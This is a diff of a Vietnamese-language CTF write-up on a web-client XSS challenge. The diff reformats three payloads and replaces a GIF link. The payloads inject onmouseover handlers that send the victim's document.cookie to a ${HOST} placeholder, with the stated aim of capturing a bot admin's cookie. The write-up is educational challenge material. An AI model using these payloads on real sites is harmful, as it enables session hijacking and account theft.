@@ -314,9 +314,11 @@ Có vẻ filter vài kí tự đặc biệt `+ < > " ` riêng kí tự ' %27 v�
 Như chall `XSS - Stored` mình cũng sẽ bắt request để nhận được cookie trên từ Bot-Ad bằng những payloads sau:
 
 
->hi' onmouseover='document.location=%22${HOST}?%22.concat(document.cookie)
->hi' onmouseover='document.write(%22<img src=${HOST}?%22.concat(document.cookie).concat(%22 />%22))
->hi' onmouseover='setTimeout(function()%7Bdocument.location=%22${HOST}?%22.concat(document.cookie);%7D,1)
+> - hi' onmouseover='document.location=%22${HOST}?%22.concat(document.cookie)
+
+> - hi' onmouseover='document.write(%22<img src=${HOST}?%22.concat(document.cookie).concat(%22 />%22))
+
+> - hi' onmouseover='setTimeout(function()%7Bdocument.location=%22${HOST}?%22.concat(document.cookie);%7D,1)
 
 ![Pic22](../img/26032018/pic22.png)
 
@@ -338,7 +340,7 @@ Về phần `Web-Client` thì mình chỉ dừng lại ở mức này, mình s�
 
 Cheering ...
 
-![Alt Text](https://gph.is/g/Z2YXyba)
+![Alt Text](https://media.giphy.com/media/J5Xd9gM8TphqCmfy2k/giphy.gif)
 
 
 
